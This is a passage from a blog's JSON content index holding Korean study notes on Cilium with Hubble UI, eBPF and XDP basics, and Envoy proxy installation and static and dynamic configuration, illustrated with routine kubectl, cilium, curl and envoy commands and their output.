\u0026#34;cilium/v2::CiliumEndpoint\u0026#34;, \u0026#34;cilium/v2::CiliumNetworkPolicy\u0026#34;, \u0026#34;cilium/v2::CiliumNode\u0026#34;, \u0026#34;cilium/v2alpha1::CiliumCIDRGroup\u0026#34;, \u0026#34;core/v1::Namespace\u0026#34;, \u0026#34;core/v1::Pods\u0026#34;, \u0026#34;core/v1::Service\u0026#34;, \u0026#34;networking.k8s.io/v1::NetworkPolicy\u0026#34;] # KubeProxyReplacement: True [ens5 192.168.10.10 fe80::b1:11ff:feba:7ce9 (Direct Routing)] # Host firewall: Disabled # SRv6: Disabled # CNI Chaining: none # CNI Config file: successfully wrote CNI configuration file to /host/etc/cni/net.d/05-cilium.conflist # Cilium: Ok 1.16.3 (v1.16.3-f2217191) # NodeMonitor: Listening for events on 4 CPUs with 64x4096 of shared memory # Cilium health daemon: Ok # IPAM: IPv4: 4/254 allocated from 172.16.0.0/24, # IPv4 BIG TCP: Disabled # IPv6 BIG TCP: Disabled # BandwidthManager: Disabled # Routing: Network: Native Host: BPF # Attach Mode: TCX # Device Mode: veth # Masquerading: BPF [ens5] 192.168.0.0/16 [IPv4: Enabled, IPv6: Disabled] # Controller Status: 29/29 healthy # Proxy Status: OK, ip 172.16.0.231, 0 redirects active on ports 10000-20000, Envoy: external # Global Identity Range: min 256, max 65535 # Hubble: Ok Current/Max Flows: 4095/4095 (100.00%), Flows/s: 26.15 Metrics: Ok # Encryption: Disabled # Cluster health: 3/3 reachable (2024-10-27T05:05:44Z) # Modules Health: Stopped(0) Degraded(0) OK(45) alias c0=\u0026#34;kubectl exec -it $CILIUMPOD0 -n kube-system -c cilium-agent -- cilium\u0026#34; c0 status | grep KubeProxyReplacement # KubeProxyReplacement: True [ens5 192.168.10.10 fe80::b1:11ff:feba:7ce9 (Direct Routing)] iptables MASQ 대신 eBPF MASQ 사용을 아래와 같이 확인할 수 있습니다.\ncilium config view | grep -i masq # enable-bpf-masquerade true # enable-ipv4-masquerade true # enable-ipv6-masquerade true # enable-masquerade-to-route-source false c. Hubble UI 가시성이 있는 것을 다들 좋아하고, 저도\u0026hellip; 살짝 께름칙하지만 좋아하기 때문에\nHublle UI를 띄워볼까요?\n이미 helm을 통해서, 해당 서비스가 올라와 있는 것을 확인합니다.\nkubectl get -n kube-system svc hubble-ui # NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE # hubble-ui ClusterIP 10.10.183.16 \u0026lt;none\u0026gt; 80/TCP 146m 이걸 살짝 맘에는 안들지만 NodePort로 노출시켜봅시다.\nkubectl patch -n kube-system svc hubble-ui -p \u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;NodePort\u0026#34;}}\u0026#39; # service/hubble-ui patched b HubbleUiNodePort=$(kubectl get svc -n kube-system hubble-ui -o jsonpath={.spec.ports[0].nodePort}) # 30401 echo -e \u0026#34;Hubble UI URL = http://$(curl -s ipinfo.io/ip):$HubbleUiNodePort\u0026#34;Port\u0026#34; # Hubble UI URL = http://13.125.233.122:30401 우오오오\u0026hellip; UI 잘 뜨네요.\n아무것도 안띄워서, kube-system 살펴보겠습니다.\n9. 뱀다리 a. Netplan Ubuntu 에서는 언제부터인지 기억이 안나는데, 기본값으로 netplan을 네트워크 설정 도구로 사용합니다.\nYAML로 네트워크 설정을 할 수 있다는 점을 포함해 많은 이점도 있고,\n버전 엡데이트를 통해 개선이 많이 이루어져서 관심이 있다면 살펴보는 것도 좋을 것 같습니다.\nDesign Overview/Netplan\n실제로도 Ubuntu 기반의 EC2를 살펴보면 다음과 같습니다.\ncat /etc/netplan/50-cloud-init.yaml # # This file is generated from information provided by the datasource. Changes # # to it will not persist across an instance reboot. To disable cloud-init\u0026#39;s # # network configuration capabilities, write a file # # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: # # network: {config: disabled} # network: # ethernets: # ens5: # dhcp4: true # dhcp6: false # match: # macaddress: 02:b1:11:ba:7c:e9 # set-name: ens5 # version: 2 b. 그래서 XDP는 어디에 있나요? 이 글에서 일단 helm으로 hubble UI까지 뜨는 것을 봤으니, 언젠가\u0026hellip; 이어서 써보고 싶네요.\nReference 중간에 언급된 Docs 외에 참고한 유용한 링크입니다.\nBonding 인터페이스에서 Cilium XDP 활성화 하기/음하하 eBPF and Cillum CNI/Sigrid Jin@Medium ","date":"2024-10-26T01:35:59+09:00","permalink":"https://blog.minseong.xyz/post/kans-8w-cilium-trial/","section":"post","tags":["kans","ebpf","cilium","kubeadm","kubernetes"],"title":"Kubernetes Service(5): Cillium Quick-start w/Hubble UI"},{"categories":null,"contents":" 고쳐야할 부분이 너무 많아서 나중에 해당 부분만 글을 작성할 예정입니다.\n어느덧 이번 스터디도 대망의 Cilium을 다루기 시작합니다.\nCilium에 이렇게도 (저를 포함한) 모?두가 열광하는지 알아보기 전에\n근간이 되는 eBPF를 먼저 가볍게 알아보고 가려합니다.\n이 때는 설마 했지만, 역시나 스불재 엔딩이었다\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n1. Linux Network Stack 스터디 1주차의 Jenkins 컨테이너에서 Host의 Docker 데몬 사용하기에서 가볍게 맛을 보고 도망치기 바빴지만, 여튼 아래의 사항은 스쳐지나갔습니다.\niptables: userspace 기반의 네트워킹 ufw, firewalld 등의 방화벽 프로그램이 이를 래핑하였다는 건 대충 넘어간다하더라도,\nLinux 환경에서 userspace를 통해 제어를 한다는 것을 알아두었을 때,\n이를 네트워킹 스텍으로 사용하고 있는 기존의 방식이 약간이라도 번거롭다는 것을 느낄 수 있습니다.\n그 의미는 yaml에 적용하면, 일일히 iptables를 수정하여 사용한다는 의미이기 때문입니다.\n이를 또 풀게되면\u0026hellip;\n한번 규칙(rule)을 수정한다고 할때, 재생성=모든 규칙을 업데이트한다. Chaning 된 규칙은 연결리스트이기 때문에 모든 동작의 복잡도는 O(n). ACLs는 우선순위가 높은 규칙에서 순차적으로 적용됩니다. IP 및 포트를 기반으로 하며, L7 프로토콜에 대해서는 지원이 되지 않습니다. 새로운 IP 혹은 포트가 추가되면, 규칙은 추가되어야하고 체이닝은 바뀌어야합니다.\n즉 그때마다 모든 규칙을 업데이트해야하는 것입니다. 결국 kube-proxy처럼 이를 활용한 Kubernetes에 있어 리소스 오버헤드가 발생한다고, Youtube/FOSDEM2020에 나와있습니다.\n일반적으로 iptables를 쓰는 것이 kernel 단의 netfilter를 조작하는 익숙한 방식이라 적용하기 효율적이었을 것이라 생각됩니다. 2. BPF(Berkeley Packet Filter) kernel hooks BPF를 커널에 삽입하여, 패킷을 필터링(통제)할 수 있다고 하는데\u0026hellip; 이걸로는 크게 와닿지 않고요.\n다른 글에도 tcpdump를 대표적인 사용례로 소개하고 있습니다.\n도서출판 인사이트에 따르면, 패킷 필터링을 넘어 고급 성능 분석 도구 등에 이용되는 다양한 분야에 사용가능한 범용 실행 엔진을 일컽는 독립적 기술이라고 하는데, 커널의 내부를 들여다 볼 수 있는 초능력(매직!)을 준다고 합니다.\n컴퓨터과학에 초능력이라니, 처음엔 갸웃했는데 Cilium을 보면서 그저 믿는 수밖에 없었죠.\nBPF: A Tour of Program Types BPF In Depth: Communicating with Userspace bpftune - Using Reinforcement Learning in BPF 위의 포스팅에 자세히 나와있지만, 제가 이해하려고 아래와 같이 끄적였습니다.\nSyscall userspace map interaction(상호작용)을 수행합니다.\nSockmap BPF Map의 한 유형으로 보이며, 소켓을 저장하고 관리하는데 사용되는 것 같습니다.\nBPF Map은 BPF 프로그램이 다른 BPF프로그램 및 map 데이터를 볼 수 있는 다른 userspace 프로그램으로부터 정보를 얻는 데 쓰인다고 합니다.\n더 자세한 것은 The Linux Kernel Docs에서.\nSockops: also called TCP-BPF mechanism that support setting TCP parameters. ops라길래, xops인줄 알았는데 operand인 건에 대하여;\n한번 찾아보니 좋은 글이 있었습니다. eBPF系列-ebpf map之使用sockmap提升本地socket转发\nnetdevconf/brakmo-tcpbpf-talk와 병행해서 읽어본 바, 현재 이해한 사항은\u0026hellip;\n(1) SYN 수신 시 : BPF_SOCK_OPS_ACTIVE_ESTABLISHED_CB 히트\n(2) SYN-ACK 수신 시 : BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB 히트\n(3) 이 외에도 RTO 시간을 동적으로 조정가능하다는 것인데, 아래 블로그에 재미나\u0026rsquo;보이는\u0026rsquo; 예시가 있습니다. 언젠가 저 RTO를 왜 조작하는지 이유를 좀 더 알아봤으면 좋겠네요.\nCustomize TCP initial RTO (retransmission timeout) with BPF\nCgroups / TC(Transmission Control) Hooks 사실 TC가 트래픽 컨트롤 아닌가, IPv4, IPv6 는 cgroup 이죠? 라는 질문을 받고,\n뭔가 잘?못 되었다는 생각이 들어서 이 글을 통해 정말 조금만 더 파보기로 했습니다. (또 후회 중)\nOpenEuler/eBPF Introduction에 의하면 cgroup의 경우, 당연한 이야기겠지만 Permission 이야기로 생각이 되는데, BPF_PROG_TYPE_CGROUP_DEVICE처럼 쓸 수 있다고 생각되어 집니다.\neunomia/eBPF Tutorial by Example 20: tc Traffic Control에서\ntc(traffic control)과 TC(Transmission Control)을 구분하고 있는데,\n결국 무엇인지는 아직 헷갈립니다. 전송하는건 똑같으니 그만 좀 생각해볼까\n아직은 확신을 하지 못했으므로 아래의 글과 함께 보류해보겠습니다.\nWhirl Offload/Understanding tc “direct action” mode for BPF\nman7/tc-bpf(8)#DESCRIPTION\n당연히 traffic control로 기재야 되어있겠지만, 설명을 읽어보니\n(SHAPING) When traffic is shaped, its rate of transmission is under control.\n이렇게 적혀있어서, 결국 전송속도 제어이니 둘 다 맞는 말 같기도\u0026hellip;?\n여튼 shaping은 burst 완화에 도움이 되고, egress 에서 발생한다고 합니다.\nXDP(eXpress Data Path) Red Hat/Get started with XDP을 보니, 서두부터 learning curve가 심하다고 하는군요. 접을까\n하위로 안내된 Red Hat/Achieving high-performance, low-latency networking with XDP: Part I를 살펴봅시다.\nXDP 이전의 패킷 처리를 위한 커널 솔루션은 DPDK(Data Plane Development Kit)이라는 bypass 솔루션 대비 10배 이상 성능이 뒤쳐져있었다고 합니다.\n하지만 XDP를 통해, 아래의 장점을 포함하여 XDP 지원 드라이버에서 14Mpps 이상을 처리할 수 있다고합니다.\n(0) 커널 내 코드 추가 없이 커널 동작 변경 및 확장: ??? 뭐라고?\n(1) SKBs(socket buffers) 관리의 오버헤드 제거(?)\n(2) 패킷당 메모리 관리 오버헤드 감소\n(3) 더 효과적인 대량 처리 가능\n음 써놓고도 다시 읽어보니 잘 모르겠네요.\n여튼, 커널 내부의 저수준 hook에 BPF(eBPF) 프로그램을 붙일 수 있다고 합니다.\n이 hook이 network device driver에 의해 구현되는 시점은\n현재(current) 패킷에 소켓 버퍼가 할당되기 전이라고 합니다.\n일반적으로 NAPI 방식의 poll()과 같이,\ningress traffic proccessing function(인그레스 트래픽 처리 함수)내부에서 처리된다고 합니다.\n와 장황하게 쓰니, 더 모르겠어!\n3. eBPF(Extended BPF) 앞의 설명이 장황했는데, 아래의 그림을 조금은 이해할 수 있게 되었습니다. 과연\nSource: Is it Observable/How to observe your network with eBPF\n앞선 내용에서도 eBPF가 간혹 나오는데 그야 BPF에서 확장된 것이니 기본원리는 같을 수 밖에 없을 것 같습니다.\n핵심: 커널의 current feature(현재 기능)을 개선 할 수 있음.\n커널이 소켓 연결이나 다른 프로세스를 관리할 때, KPIs를 수집하는 프로세스를 추가 어째서 KPI를 여기서 보는 것인가 활용: 무궁무진\n네트워킹: 분석, 라우팅 등 보안: 특정 규칙에 따라 트래픽 필터링 및 허용/차단 트래픽 보고 실행흐름 수집(execution flows): scope: userspace ~ kernel instruction purpose: tracing, profiling Observability~~(관찰가능성\u0026hellip;)~~: Not Pooling Information: EFFECTIVE!!! eBPF 프로그람은 측정이 필요할 때, 정확히 실행된다고 합니다. 과장 OR 오해: 브라우저에 JavaScript 있는 것에 비견함;;;\n아래 그림으로 급한 마무리를 시도해보겠습니다.\nSource: iovisor/bcc @github\n4. etc. 1000 Mpbs = 1488000 pps = 1.488 Mpps: 궁금해서 찾아본 것. 빠르네요. 672 bit/s(=bps) = 1 Packet/s(=pps) 1 Mbps = 1488 pps = 1.488 Kpps Source: inyong_pang @velog ","date":"2024-10-21T19:47:33+09:00","permalink":"https://blog.minseong.xyz/post/kans-8w-why-ebpf/","section":"post","tags":["kans","ebpf","xdp","kubernetes"],"title":"Why eBPF?"},{"categories":null,"contents":"정적/동적 설정을 알아봅니다.\ntraefik을 맛볼때는, 호되게 데인 부분인데 envoy는 상대적으로 명료했습니다.\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n1. Static Configuration 아래와 같이 구성됩니다.\nstatic_resources listeners clusters (a) static_resources envoy의 시작과 함께, 정적으로 설정되는 모든 리소스를 포함한다고 합니다.\n실제로 envoy-demo.yaml 파일을 열어보면 최상단에 static_resources이 선언되어 있습니다.\nstatic_resources: listeners: (b) listeners envoy-demo.yaml 파일 기준,\nsocket_address: 리스너는 포트 10000에서 수신하도록 설정되어 있습니다. route_config: 모든 경로에 대해 service_envoyproxy_io 클러스터로 라우팅합니다. # cat envoy-demo.yaml | grep -A 30 -B 2 listeners static_resources: listeners: - name: listener_0 address: socket_address: address: 0.0.0.0 port_value: 10000 filter_chains: - filters: - name: envoy.filters.network.http_connection_manager typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_http access_log: - name: envoy.access_loggers.stdout typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.access_loggers.stream.v3.StdoutAccessLog http_filters: - name: envoy.filters.http.router typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.router.v3.Router route_config: name: local_route virtual_hosts: - name: local_service domains: [\u0026#34;*\u0026#34;] routes: - match: prefix: \u0026#34;/\u0026#34; route: host_rewrite_literal: www.envoyproxy.io cluster: service_envoyproxy_io (c) clusters envoy-demo.yaml 파일 기준,\nservice_envoyproxy_io 클러스터는 www.envoyproxy.io로 프록시합니다. TLS를 사용하여 프록시합니다. # cat envoy-demo.yaml | grep -A 18 clusters clusters: - name: service_envoyproxy_io type: LOGICAL_DNS # Comment out the following line to test on v6 networks dns_lookup_family: V4_ONLY load_assignment: cluster_name: service_envoyproxy_io endpoints: - lb_endpoints: - endpoint: address: socket_address: address: www.envoyproxy.io port_value: 443 transport_socket: name: envoy.transport_sockets.tls typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext sni: www.envoyproxy.io 2. xDS Comprenhensive Overview 동적 설정으로 넘어가기 전에 envoy xDS를 이해하고자 하였습니다.\nxDS 프로토콜을 구현하는 파일들을 사용해서 동적 구성을 할 수 있다고 합니다.\nxDS 프로토콜: envoy가 동적 리소스를 검색할 때 해당 서비스와 API를 xDS로 총칭합니다. (1) 관찰할 파일명을 명시하거나, (2) gRPC 스트림을 시작하거나, 혹은 (3) REST-JSON API를 폴링해서 구현합니다. 이 중, 1항의 방법을 제외하고는 [DiscoveryResquest] Proto Payload와 함께 요청을 보내어 구현됩니다.\n\u0026lsquo;xDS\u0026rsquo; 프로토콜의 구분 SotW Incremental separeted gRPC (a) (b) single gRPC (c) (d) SotW는 Snapshot of the World를 의미하며, 모든 리소스로 이해했습니다.\n(a) Basic xDS: 모든 리소스 유형에 대한, 별도의 gRPC 스트림 (b) Incremental xDS: 각 리소스 유형에 대한 중분, 별도의 gRPC 스트림 (c) Aggregated Discovery Service: 모든 리소스 유형에 대한, 단일 gRPC 스트림 (d) Incremental ADS: 각 리소스 유형에 대한 중분, 단일 gRPC 스트림\n문서를 보고, 선명하게 이해가 오지 않아 매트릭스를 구성했는데도 뭔가 갸웃합니다.\n여하간, 증분을 사용하면 이전 상태와 상대 델타에만 적용할 수 있는 것 같습니다.\ngRPC 단일 스트림은 최종 일관성(멱등성?) 모델을 제공하고, 다중 스트림은 리소스의 lazy loading에 대응할 메커니즘이라고 합니다.\n야 이거 Firehose\u0026hellip;. 음 아직도 좀 모호합니다\n3. Dynamic Configuration (from filesystem) Runtime 값 런타임 설명이 별도로 있는데 좀 난해하네요.\n아래와 같이 구성됩니다.\nnode : 프록시 서버 식별 dynamic_resources : 동적 구성의 위치를 명시 listeners clusters 아래와 같이, 데모 파일을 받아봅시다.\ncurl -O https://www.envoyproxy.io/docs/envoy/latest/_downloads/9a41bc513e17e885884b3deebf435d2a/envoy-dynamic-filesystem-demo.yaml (a) node 반드시 cluster와 id를 설정해야 합니다.\n# cat envoy-dynamic-filesystem-demo.yaml | grep -A 2 node: node: cluster: test-cluster id: test-id (b) dynamic_resources 예제에서는 LDS와 CDS 데모파일을 사용합니다.\ncurl -O https://www.envoyproxy.io/docs/envoy/latest/_downloads/5cf56125ff834c0e2f21f71e1e8916f2/envoy-dynamic-lds-demo.yaml curl -O https://www.envoyproxy.io/docs/envoy/latest/_downloads/92bba5b0c48a649b4bc8663000cd097a/envoy-dynamic-cds-demo.yaml listeners: envoy-dynamic-lds-demo.yaml 포트 10000에서 HTTP 리스너를 구성합니다.\n모든 도메인과 경로는 service_envoyproxy_io 클러스터로 라우팅합니다.\nhost 헤더는 www.envoyproxy.io로 덮여씁니다.\n# cat envoy-dynamic-lds-demo.yaml resources: - \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.config.listener.v3.Listener name: listener_0 address: socket_address: address: 0.0.0.0 port_value: 10000 filter_chains: - filters: - name: envoy.http_connection_manager typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_http http_filters: - name: envoy.router typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.router.v3.Router route_config: name: local_route virtual_hosts: - name: local_service domains: - \u0026#34;*\u0026#34; routes: - match: prefix: \u0026#34;/\u0026#34; route: host_rewrite_literal: www.envoyproxy.io cluster: example_proxy_cluster clusters: envoy-dynamic-cds-demo.yaml example_proxy_cluster 클러스터는 www.envoyproxy.io로 TLS프록시합니다.\n# cat envoy-dynamic-cds-demo.yaml resources: - \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.config.cluster.v3.Cluster name: example_proxy_cluster type: STRICT_DNS typed_extension_protocol_options: envoy.extensions.upstreams.http.v3.HttpProtocolOptions: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.upstreams.http.v3.HttpProtocolOptions explicit_http_config: http2_protocol_options: {} load_assignment: cluster_name: example_proxy_cluster endpoints: - lb_endpoints: - endpoint: address: socket_address: address: www.envoyproxy.io port_value: 443 transport_socket: name: envoy.transport_sockets.tls typed_config: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext sni: www.envoyproxy.io 4. Dynamic Configuration (from Control Plane) 컨트롤 플레인의 구성을 envoy에게 전달하도록 설정해야하기에 뭔가 더 길게 써있습니다.\n이때, 컨트롤플레인은 Envoy API와 호환되는 Gloo 및 Istio 등을 지칭합니다.\n아래와 같은 구성이 필요합니다.\nnode : 고유한 프록시 서버 식별 dynamic_resources : 동적으로 업데이트해야하는 구성을 envoy에게 명시 static_resources : 가져올 구성의 위치를 envoy에게 명시 예제에서 사용할 데모 파일을 받아봅니다.\ncurl -O https://www.envoyproxy.io/docs/envoy/latest/_downloads/fe2234c3a6762bdffb5300e299973700/envoy-dynamic-control-plane-demo.yaml node: 3-a와 동일합니다. dynamic_resources : 동적 구성과 이 업데이트를 연결할 cluster를 명시합니다. 아래 예시에서는 각 xDS 유형의 설정에 의해 구성이 제공됩니다.\n# cat envoy-dynamic-control-plane-demo.yaml | grep -A 2 dynamic_resources: dynamic_resources: ads_config: api_type: GRPC grpc_services: - envoy_grpc: cluster_name: xds_cluster cds_config: ads: {} lds_config: ads: {} static_resources : (말이 좀 이상하긴 한데) 동적구성을 가져올 곳을 명시합니다. 아래 예시에서는, http://my-controle-plane:18000에서 컨트롤 플레인을 찾도록 xds_cluster 에 정의되어 있습니다.\n# cat envoy-dynamic-control-plane-demo.yaml | grep -A 17 static_resources: static_resources: clusters: - type: STRICT_DNS typed_extension_protocol_options: envoy.extensions.upstreams.http.v3.HttpProtocolOptions: \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.upstreams.http.v3.HttpProtocolOptions explicit_http_config: http2_protocol_options: {} name: xds_cluster load_assignment: cluster_name: xds_cluster endpoints: - lb_endpoints: - endpoint: address: socket_address: address: my-control-plane port_value: 18000 ","date":"2024-10-19T16:59:16+09:00","permalink":"https://blog.minseong.xyz/post/kans-7w-envoy-config/","section":"post","tags":["kans","envoy","proxy","kubernetes"],"title":"Kubernetes Service(4): envoy config"},{"categories":null,"contents":" 따로 슥 찾아보니, envoy는 Micro Service Architecture 등 구현된 단위 기능간의 통신을 위한 L7 Proxy 라고 합니다.\nDocker Compose 정도나 일반 서비스에서는 굳이 필요하지는 않을 것 같지만, Service Mesh 환경에서는 알아두면 좋을 것 같아 훝어봅니다.\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n1. Envoy Installation Docs: Installing Envoy wget -O- https://apt.envoyproxy.io/signing.key | sudo gpg --dearmor -o /etc/apt/keyrings/envoy-keyring.gpg echo \u0026#34;deb [signed-by=/etc/apt/keyrings/envoy-keyring.gpg] https://apt.envoyproxy.io jammy main\u0026#34; | sudo tee /etc/apt/sources.list.d/envoy.list sudo apt-get update sudo apt-get install envoy envoy --version 학습환경은 root로 접속되어 있기에 sudo는 쓰지 않았습니다.\nwget -O- https://apt.envoyproxy.io/signing.key | sudo gpg --dearmor -o /etc/apt/keyrings/envoy-keyring.gpg --2024-10-15 09:46:22-- https://apt.envoyproxy.io/signing.key Resolving apt.envoyproxy.io (apt.envoyproxy.io)... 13.215.144.61, 13.251.96.10, 2406:da18:880:3802::c8, ... Connecting to apt.envoyproxy.io (apt.envoyproxy.io)|13.215.144.61|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 3158 (3.1K) [application/vnd.apple.keynote] Saving to: ‘STDOUT’ - 100%[===================\u0026gt;] 3.08K --.-KB/s in 0s 2024-10-15 09:46:23 (86.8 MB/s) - written to stdout [3158/3158] echo \u0026#34;deb [signed-by=/etc/apt/keyrings/envoy-keyring.gpg] https://apt.envoyproxy.io jammy main\u0026#34; | sudo tee /etc/apt/sources.list.d/envoy.list deb [signed-by=/etc/apt/keyrings/envoy-keyring.gpg] https://apt.envoyproxy.io jammy main apt-get update \u0026amp;\u0026amp; apt-get install envoy -y Reading package lists... Done Building dependency tree... Done Reading state information... Done The following NEW packages will be installed: envoy 0 upgraded, 1 newly installed, 0 to remove and 8 not upgraded. Need to get 73.2 MB of archives. After this operation, 0 B of additional disk space will be used. Get:1 https://apt.envoyproxy.io jammy/main amd64 envoy amd64 1.31.2 [73.2 MB] Fetched 73.2 MB in 6s (12.2 MB/s) Selecting previously unselected package envoy. (Reading database ... 66661 files and directories currently installed.) Preparing to unpack .../envoy_1.31.2_amd64.deb ... Unpacking envoy (1.31.2) ... Setting up envoy (1.31.2) ... You have installed the Envoy proxy server. You can check your Envoy version by running the following in a terminal: $ envoy --version Documentation for your version is available at: https://www.envoyproxy.io/docs The Envoy project can be found at: https://github.com/envoyproxy/envoy Scanning processes... Scanning linux images... Running kernel seems to be up-to-date. No services need to be restarted. No containers need to be restarted. No user sessions are running outdated binaries. No VM guests are running outdated hypervisor (qemu) binaries on this host. envoy --version envoy version: cc4a75482810de4b84c301d13deb551bd3147339/1.31.2/Clean/RELEASE/BoringSSL 옵션 확인 envoy 옵션은 envoy -h 로 확인가능합니다.\nman page는 따로 설치되지 않는 것 같습니다.\nman envoy # No manual entry for envoy 2. Envoy Quick start 잘 모르겠으니 그냥 따라합니다. Envoy Docs (a) Config 데모 적용 한 쪽에는 Envoy를 켜고, 한 쪽에서는 접속 테스트를 해볼 겁니다.\n스터디에서 같은 서브넷 구성이 된 환경을 제공해주셨기에, 이 점은 양해바랍니다.\nTerminal 0) Turn On Envoy foreground 상태라, 켜놓은 상태에서 다른 터미널을 엽니다. curl -O https://www.envoyproxy.io/docs/envoy/latest/_downloads/92dcb9714fb6bc288d042029b34c0de4/envoy-demo.yaml envoy -c envoy-demo.yaml Terminal 1) 테스트 ss -tnlp # State Recv-Q Send-Q Local Address:Port Peer Address:Port Process # LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* users:((\u0026#34;systemd-resolve\u0026#34;,pid=347,fd=14)) # LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\u0026#34;sshd\u0026#34;,pid=703,fd=3)) # LISTEN 0 4096 0.0.0.0:10000 0.0.0.0:* users:((\u0026#34;envoy\u0026#34;,pid=10390,fd=25)) # LISTEN 0 4096 0.0.0.0:10000 0.0.0.0:* users:((\u0026#34;envoy\u0026#34;,pid=10390,fd=24)) # LISTEN 0 511 *:80 *:* users:((\u0026#34;apache2\u0026#34;,pid=2376,fd=4),(\u0026#34;apache2\u0026#34;,pid=2375,fd=4),(\u0026#34;apache2\u0026#34;,pid=2373,fd=4)) # LISTEN 0 128 [::]:22 [::]:* users:((\u0026#34;sshd\u0026#34;,pid=703,fd=4)) curl -s http://127.0.0.1:10000 | grep -o \u0026#34;\u0026lt;title\u0026gt;.*\u0026lt;/title\u0026gt;\u0026#34; # \u0026lt;title\u0026gt;Envoy proxy - home\u0026lt;/title\u0026gt; echo -e \u0026#34;http://$(curl -s ipinfo.io/ip):10000\u0026#34; # http://54.180.163.59:10000 Terminal2) Test in k3s master node 192.168.10.200: Where envoy is running curl -s http://192.168.10.200:10000 | grep -o \u0026#34;\u0026lt;title\u0026gt;.*\u0026lt;/title\u0026gt;\u0026#34; # \u0026lt;title\u0026gt;Envoy proxy - home\u0026lt;/title\u0026gt; (b) Config 설정 변경 앞서 구동한 envoy를 종료하고, 다시 실행합니다.\n-c 나 --config-path 옵션은 동일합니다.\n다만, 옵션 override를 할 때, 추가로 merging 되는 환경변수는\n--config-path 옵션을 사용하도록 권하는 것 같습니다.\ncat \u0026lt;\u0026lt;EOT\u0026gt; envoy-override.yaml admin: address: socket_address: address: 0.0.0.0 port_value: 9902 EOT envoy -c envoy-demo.yaml --config-path \u0026#34;$(cat envoy-override.yaml)\u0026#34; 이 경우, 10000 Port 외에 추가로 9902 포트를 통해 Admin 페이지에 접근 할 수 있었습니다.\n(c) Config 유효성 검사 --mode validate 옵션을 통해, 설정 파일의 유효성을 검사할 수 있습니다.\nenvoy --mode validate -c envoy-demo.yaml # [2024-10-19 15:45:46.382][10661][info][main] [source/server/server.cc:879] runtime: {} # [2024-10-19 15:45:46.383][10661][info][config] [source/server/configuration_impl.cc:168] loading tracing configuration # [2024-10-19 15:45:46.383][10661][info][config] [source/server/configuration_impl.cc:124] loading 0 static secret(s) # [2024-10-19 15:45:46.383][10661][info][config] [source/server/configuration_impl.cc:130] loading 1 cluster(s) # [2024-10-19 15:45:46.384][10661][info][config] [source/server/configuration_impl.cc:138] loading 1 listener(s) # [2024-10-19 15:45:46.386][10661][warning][misc] [source/extensions/filters/network/http_connection_manager/config.cc:88] internal_address_config is not configured. The existing default behaviour will trust RFC1918 IP addresses, but this will be changed in next release. Please explictily config internal address config as the migration step or config the envoy.reloadable_features.explicit_internal_address_config to true to untrust all ips by default # [2024-10-19 15:45:46.389][10661][info][config] [source/server/configuration_impl.cc:154] loading stats configuration # configuration \u0026#39;envoy-demo.yaml\u0026#39; OK (d) Envoy logging 설정 기본적으로 /dev/stderr에 로깅을 한다고 합니다.\ncharacter special file(문자 특수 파일)이네요.\n랄까, container 환경에서는 stderr/stdout을 통해 일반적으로 로깅하는 것 같긴 합니다.\nreadlink -e /dev/stderr # /dev/pts/3 readlink /dev/stderr # /proc/self/fd/2 readlink /proc/self/fd/2 # /dev/pts/3 ls -l /dev/pts/3 # crw------- 1 root tty 136, 3 Oct 19 16:00 /dev/pts/3 [택1] 실행시 파라미터 설정 --log-level 옵션을 통해, 로깅할 경로를 지정할 수 있습니다.\n# ls /var/log/envoy # ls: cannot access \u0026#39;/var/log/envoy\u0026#39;: No such file or directory # mkdir -p /var/log/envoy mkdir -p /tmp/envoy-logs envoy -c envoy-demo.yaml --log-path /tmp/envoy-logs/custom.log [택2] Admin 인터페이스에서 설정 cat envoy-demo.yaml | grep -A 3 -B 3 access_log: # typed_config: # \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager # stat_prefix: ingress_http # access_log: # - name: envoy.access_loggers.stdout # typed_config: # \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.access_loggers.stream.v3.StdoutAccessLog [이외] Log extension Log extension을 통해, 다양한 로깅 설정을 할 수 있습니다. (e) Envoy networking 기본값은 IPv6와 IPv4를 모두 활성화하나 IPv6를 비활성화하여야하는 상황이 있다면,\n데모 설정파일같이 dns_lookup_family를 V4_ONLY로 설정하면 되겠습니다.\nlinux 호스트가 아닌 환경에서도 해당 케이스가 있을 수 있다고 합니다. (Docker Docs)\ncat envoy-demo.yaml | grep -A 7 -B 4 dns_lookup_family clusters: - name: service_envoyproxy_io type: LOGICAL_DNS # Comment out the following line to test on v6 networks dns_lookup_family: V4_ONLY load_assignment: cluster_name: service_envoyproxy_io endpoints: - lb_endpoints: - endpoint: address: socket_address: (f) Envoy debugging [택1] basic -l 혹은 --log-level 옵션을 통해, 로깅 레벨을 설정할 수 있습니다.\nDefault: info List: trace, debug, info, warning/warn, error, critical, off [택2] component 